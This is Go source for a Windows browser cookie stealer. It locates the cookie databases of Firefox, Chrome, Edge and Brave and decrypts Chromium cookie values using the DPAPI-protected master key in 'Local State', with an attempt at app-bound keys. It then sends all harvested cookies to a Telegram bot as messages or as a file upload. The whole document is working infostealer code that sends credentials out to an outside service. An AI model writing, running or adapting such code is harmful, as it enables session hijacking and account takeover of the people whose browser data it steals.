package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"os"
	"path/filepath"
	"strings"
	"time"

	"net/http"

	"github.com/joho/godotenv"
	_ "github.com/mattn/go-sqlite3"
)

var chromiumMasterKeyCache = map[string][]byte{}
var chromiumAppBoundKeyCache = map[string][]byte{}

func main() {
	err := godotenv.Load()
	if err != nil {
		fmt.Println("Warning: Failed to load .env file, using environment variables")
	}

	token := os.Getenv("TELEGRAM_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")
	if token == "" || chatID == "" {
		fmt.Println("Error: Set TELEGRAM_TOKEN and TELEGRAM_CHAT_ID environment variables in .env file")
		return
	}

	user := os.Getenv("USERNAME")

	browsers := []struct {
		name        string
		cookiesPath string
		parser      func(string) ([]string, error)
	}{
		{"Firefox", "C:\\Users\\%USER%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*", parseFirefox},
		{"Chrome", "C:\\Users\\%USER%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", parseChromiumCookies},
		{"Edge", "C:\\Users\\%USER%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", parseChromiumCookies},
		{"Brave", "C:\\Users\\%USER%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies", parseChromiumCookies},
	}

	for i := range browsers {
		browsers[i].cookiesPath = strings.Replace(browsers[i].cookiesPath, "%USER%", user, 1)
	}

	fmt.Println("Starting cookie collection...")

	successCount := 0
	for _, browser := range browsers {
		if _, err := os.Stat(browser.cookiesPath); os.IsNotExist(err) {
			fmt.Printf("Cookie file for %s not found: %s\n", browser.name, browser.cookiesPath)
			continue
		}

		cookies, err := browser.parser(browser.cookiesPath)
		if err != nil {
			// Skip locked DB files when browser keeps the cookie DB open.
			if strings.Contains(err.Error(), "unable to open database file") ||
				strings.Contains(err.Error(), "The process cannot access the file") {
				fmt.Printf("Error processing %s cookies: file is in use by another process. Skipping...\n", browser.name)
				continue
			}
			fmt.Printf("Error processing %s cookies: %v\n", browser.name, err)
			continue
		}
		if len(cookies) > 0 {
			sendToTelegram(token, chatID, browser.name, cookies)
			successCount++
		} else {
			fmt.Printf("No cookies found for %s\n", browser.name)
		}
	}

	fmt.Printf("\nCollection completed. Successfully processed %d browsers.\n", successCount)
}

func parseFirefox(path string) ([]string, error) {
	if strings.HasSuffix(path, "*") {
		parentDir := strings.TrimSuffix(path, "*")

		if _, err := os.Stat(parentDir); os.IsNotExist(err) {
			return nil, fmt.Errorf("Firefox profiles directory does not exist: %s", parentDir)
		}

		files, err := os.ReadDir(parentDir)
		if err != nil {
			return nil, err
		}

		var cookiesFile string
		for _, file := range files {
			if file.IsDir() {
				profilePath := parentDir + "\\" + file.Name()
				cookiesPath := profilePath + "\\cookies.sqlite"
				if _, err := os.Stat(cookiesPath); err == nil {
					cookiesFile = cookiesPath
					break
				}
			}
		}

		if cookiesFile == "" {
			cookiesFiles, err := filepath.Glob(parentDir + "\\*\\cookies.sqlite")
			if err == nil && len(cookiesFiles) > 0 {
				cookiesFile = cookiesFiles[0]
			}
		}

		if cookiesFile == "" {
			return nil, fmt.Errorf("cookies.sqlite file not found in Firefox profiles")
		}
		path = cookiesFile
	}

	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT name FROM sqlite_master WHERE type='table' AND name='moz_cookies'")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	if rows.Next() {
		rows, err = db.Query("SELECT name, value, host, path, expires, isSecure, isHttpOnly, hostOnly, session FROM moz_cookies")
		if err != nil {
			return nil, err
		}
		defer rows.Close()

		var cookies []string
		for rows.Next() {
			var name, value, host, path string
			var expires int64
			var isSecure, isHttpOnly, hostOnly bool
			var session bool
			err = rows.Scan(&name, &value, &host, &path, &expires, &isSecure, &isHttpOnly, &hostOnly, &session)
			if err != nil {
				continue
			}

			if value == "" {
				// Firefox stores encrypted cookies via NSS. Decryption not implemented.
				value = "[ENCRYPTED - NSS decryption not implemented]"
			}
			var expiresStr string
			if expires > 0 {
				expiresTime := time.Unix(expires/1000000, 0)
				expiresStr = expiresTime.Format("2006-01-02 15:04:05")
			} else {
				expiresStr = "Never"
			}

			cookie := fmt.Sprintf("Name: %s\nValue: %s\nHost: %s\nPath: %s\nExpires: %s\nSecure: %t\nHttpOnly: %t\nHostOnly: %t\nSession: %t",
				name, value, host, path, expiresStr, isSecure, isHttpOnly, hostOnly, session)
			cookies = append(cookies, cookie)
		}
		return cookies, nil
	} else {
		rows, err = db.Query("SELECT name, value, host, path, expires FROM moz_cookies")
		if err != nil {
			rows, err = db.Query("SELECT name, value, path, expires FROM moz_cookies")
			if err != nil {
				rows, err = db.Query("SELECT name, value, host, path, expires FROM cookies")
				if err != nil {
					return nil, fmt.Errorf("failed to query Firefox database: %v", err)
				}
			}
		}
		defer rows.Close()

		var cookies []string
		for rows.Next() {
			var name, value, host, path string
			var expires int64
			err = rows.Scan(&name, &value, &host, &path, &expires)
			if err != nil {
				continue
			}
			cookie := fmt.Sprintf("Name: %s, Value: %s, Host: %s, Path: %s, Expires: %d", name, value, host, path, expires)
			cookies = append(cookies, cookie)
		}
		return cookies, nil
	}
}

func parseChromiumCookies(path string) ([]string, error) {
	originalPath := path
	tempPath := path + ".tmp"

	// Copy cookie DB to avoid file lock issues while browser is running.
	err := copyFile(path, tempPath)
	if err != nil {
		fmt.Printf("Warning: failed to copy file %s, working with original. Error: %v\n", path, err)
		tempPath = path
	}

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	hasEncrypted := true
	hasFlags := true
	rows, err := db.Query("SELECT name, value, encrypted_value, host_key, path, expires_utc, is_secure, http_only, host_only, session_only FROM cookies")
	if err != nil {
		rows, err = db.Query("SELECT name, value, encrypted_value, host_key, path, expires_utc FROM cookies")
		if err == nil {
			hasFlags = false
		} else {
			rows, err = db.Query("SELECT name, value, host_key, path, expires_utc FROM cookies")
			hasEncrypted = false
			hasFlags = false
			if err != nil {
				return nil, err
			}
		}
	}
	defer rows.Close()

	var cookies []string
	totalCount := 0
	skippedCount := 0
	for rows.Next() {
		totalCount++
		var name, value, host, path string
		var encryptedValue []byte
		var expires int64
		var isSecure, isHttpOnly, hostOnly, sessionOnly bool

		if hasEncrypted && hasFlags {
			err = rows.Scan(&name, &value, &encryptedValue, &host, &path, &expires, &isSecure, &isHttpOnly, &hostOnly, &sessionOnly)
		} else if hasEncrypted && !hasFlags {
			err = rows.Scan(&name, &value, &encryptedValue, &host, &path, &expires)
			isSecure, isHttpOnly, hostOnly, sessionOnly = false, false, false, false
		} else {
			err = rows.Scan(&name, &value, &host, &path, &expires)
			isSecure, isHttpOnly, hostOnly, sessionOnly = false, false, false, false
		}

		if err != nil {
			continue
		}

		// Chromium stores many values in encrypted_value.
		if value == "" {
			if len(encryptedValue) > 0 {
				decryptedValue, err := decryptEncryptedValueBytes(encryptedValue, originalPath)
				if err != nil {
					skippedCount++
					continue
				}
				if strings.TrimSpace(decryptedValue) == "" {
					skippedCount++
					continue
				}
				value = decryptedValue
			} else {
				skippedCount++
				continue
			}
		}

		// Convert Chromium FILETIME (1601 epoch) to Unix time.
		var expiresStr string
		if expires > 0 {
			unixTime := (expires / 10000000) - 11644473600
			expiresTime := time.Unix(unixTime, 0)
			expiresStr = expiresTime.Format("2006-01-02 15:04:05")
		} else {
			expiresStr = "Never"
		}

		cookie := fmt.Sprintf("Name: %s\nValue: %s\nHost: %s\nPath: %s\nExpires: %s\nSecure: %t\nHttpOnly: %t\nHostOnly: %t\nSession: %t",
			name, value, host, path, expiresStr, isSecure, isHttpOnly, hostOnly, sessionOnly)
		cookies = append(cookies, cookie)
	}

	if skippedCount > 0 {
		fmt.Printf("Processed %d cookies, skipped %d (v20/App-Bound encrypted or empty)\n", len(cookies), skippedCount)
	}

	if tempPath != originalPath {
		os.Remove(tempPath)
	}

	return cookies, nil
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return nil
}

// decryptEncryptedValueBytes decrypts Chromium values (AES-GCM with v10/v11/v20 headers or DPAPI fallback).
func decryptEncryptedValueBytes(encryptedBytes []byte, cookiesPath string) (string, error) {
	if len(encryptedBytes) == 0 {
		return "", fmt.Errorf("empty encrypted value")
	}

	if bytes.HasPrefix(encryptedBytes, []byte("v10")) || bytes.HasPrefix(encryptedBytes, []byte("v11")) || bytes.HasPrefix(encryptedBytes, []byte("v20")) {
		masterKey, err := getChromiumMasterKey(cookiesPath)
		if err != nil {
			return "", fmt.Errorf("failed to get master key: %v", err)
		}

		if len(encryptedBytes) < 3+12+16 {
			return "", fmt.Errorf("invalid AES-GCM value length")
		}

		nonce := encryptedBytes[3:15]
		ciphertextWithTag := encryptedBytes[15:]

		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", fmt.Errorf("AES initialization error: %v", err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("GCM initialization error: %v", err)
		}

		decrypted, err := gcm.Open(nil, nonce, ciphertextWithTag, nil)
		if err != nil {
			if bytes.HasPrefix(encryptedBytes, []byte("v20")) {
				userDataDir := filepath.Dir(filepath.Dir(filepath.Dir(cookiesPath)))
				if appBoundKey, ok := chromiumAppBoundKeyCache[userDataDir]; ok {
					block, err := aes.NewCipher(appBoundKey)
					if err == nil {
						gcm, err := cipher.NewGCM(block)
						if err == nil {
							decrypted, err := gcm.Open(nil, nonce, ciphertextWithTag, nil)
							if err == nil {
								return string(decrypted), nil
							}
						}
					}
				}
				// v20 values usually remain unavailable outside browser context.
				return "", fmt.Errorf("v20 cookie (skip)")
			}
			return "", fmt.Errorf("AES-GCM decryption error: %v", err)
		}

		return string(decrypted), nil
	}

	// Use DPAPI for decryption
	decrypted, err := DPAPIDecrypt(encryptedBytes)
	if err != nil {
		return "", fmt.Errorf("decryption error: %v", err)
	}

	return string(decrypted), nil
}

func getChromiumMasterKey(cookiesPath string) ([]byte, error) {
	userDataDir := filepath.Dir(filepath.Dir(filepath.Dir(cookiesPath)))

	if userDataDir == "" || userDataDir == "." || userDataDir == "\\" {
		return nil, fmt.Errorf("invalid User Data path: cookiesPath=%s, userDataDir=%s", cookiesPath, userDataDir)
	}

	if key, ok := chromiumMasterKeyCache[userDataDir]; ok {
		return key, nil
	}

	localStatePath := filepath.Join(userDataDir, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State (%s): %v", localStatePath, err)
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey         string `json:"encrypted_key"`
			AppBoundEncryptedKey string `json:"app_bound_encrypted_key"`
		} `json:"os_crypt"`
	}

	if err := json.Unmarshal(data, &state); err != nil {
		return nil, fmt.Errorf("Local State parsing error: %v", err)
	}

	if state.OSCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("os_crypt.encrypted_key is missing")
	}

	encKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("encrypted_key base64 decoding error: %v", err)
	}

	if len(encKey) <= 5 || !bytes.Equal(encKey[:5], []byte("DPAPI")) {
		return nil, fmt.Errorf("unexpected encrypted_key format")
	}

	masterKey, err := DPAPIDecrypt(encKey[5:])
	if err != nil {
		return nil, fmt.Errorf("DPAPI master key decryption error: %v", err)
	}

	chromiumMasterKeyCache[userDataDir] = masterKey

	// Best-effort fetch for app-bound key cache.
	if state.OSCrypt.AppBoundEncryptedKey != "" {
		appBoundKey, err := getChromiumAppBoundKey(userDataDir, state.OSCrypt.AppBoundEncryptedKey)
		if err == nil {
			chromiumAppBoundKeyCache[userDataDir] = appBoundKey
		}
	}

	return masterKey, nil
}

func getChromiumAppBoundKey(userDataDir string, encryptedKeyB64 string) ([]byte, error) {
	if key, ok := chromiumAppBoundKeyCache[userDataDir]; ok {
		return key, nil
	}

	appBoundKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil, fmt.Errorf("app_bound_encrypted_key base64 decoding error: %v", err)
	}

	if len(appBoundKey) <= 5 {
		return nil, fmt.Errorf("app_bound_encrypted_key too short")
	}

	if bytes.Equal(appBoundKey[:4], []byte("APPB")) {
		decrypted, err := DPAPIDecrypt(appBoundKey[5:])
		if err != nil {
			return nil, fmt.Errorf("DPAPI app-bound key decryption error: %v", err)
		}
		return decrypted, nil
	}

	return nil, fmt.Errorf("unexpected app_bound_encrypted_key format")
}

func sendToTelegram(token, chatID string, browserName string, cookies []string) {
	const maxTelegramMessageLen = 4000
	header := fmt.Sprintf("🍪 Cookies from %s (%d):\n\n", browserName, len(cookies))
	var part bytes.Buffer

	part.WriteString(header)
	partsSent := 0

	// If cookie count is large, send as file
	if len(cookies) > 50 {
		filename := fmt.Sprintf("%s_cookies.txt", browserName)
		file, err := os.Create(filename)
		if err != nil {
			fmt.Printf("Failed to create file: %v\n", err)
			goto sendAsText
		}

		for _, cookie := range cookies {
			file.WriteString(cookie + "\n\n")
		}
		file.Close()

		if err := sendTelegramFile(token, chatID, filename, header); err != nil {
			fmt.Printf("Failed to send file to Telegram: %v\n", err)
			os.Remove(filename)
			goto sendAsText
		}

		os.Remove(filename)
		fmt.Printf("Sent %d cookies from %s to Telegram as file\n", len(cookies), browserName)
		return
	}

sendAsText:
	for _, cookie := range cookies {
		line := cookie + "\n"
		if part.Len()+len(line) > maxTelegramMessageLen && part.Len() > len(header) {
			if err := sendTelegramMessage(token, chatID, part.String()); err != nil {
				fmt.Printf("Failed to send to Telegram: %v\n", err)
				return
			}
			partsSent++
			part.Reset()
			part.WriteString(header)
		}
		part.WriteString(line)
	}

	if part.Len() > len(header) {
		if err := sendTelegramMessage(token, chatID, part.String()); err != nil {
			fmt.Printf("Failed to send to Telegram: %v\n", err)
			return
		}
		partsSent++
	}

	fmt.Printf("Sent %d cookies from %s to Telegram (%d messages)\n", len(cookies), browserName, partsSent)
}

func sendTelegramFile(token, chatID, filename, caption string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	fileWriter, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}

	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		return err
	}

	writer.WriteField("chat_id", chatID)

	writer.WriteField("caption", caption)

	writer.Close()

	resp, err := http.Post(url, writer.FormDataContentType(), &buf)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 300 {
		return fmt.Errorf("Telegram API %s: %s", resp.Status, strings.TrimSpace(string(body)))
	}

	return nil
}

func sendTelegramMessage(token, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	payload := map[string]interface{}{
		"chat_id": chatID,
		"text":    text,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 300 {
		return fmt.Errorf("Telegram API %s: %s", resp.Status, strings.TrimSpace(string(body)))
	}

	return nil
}
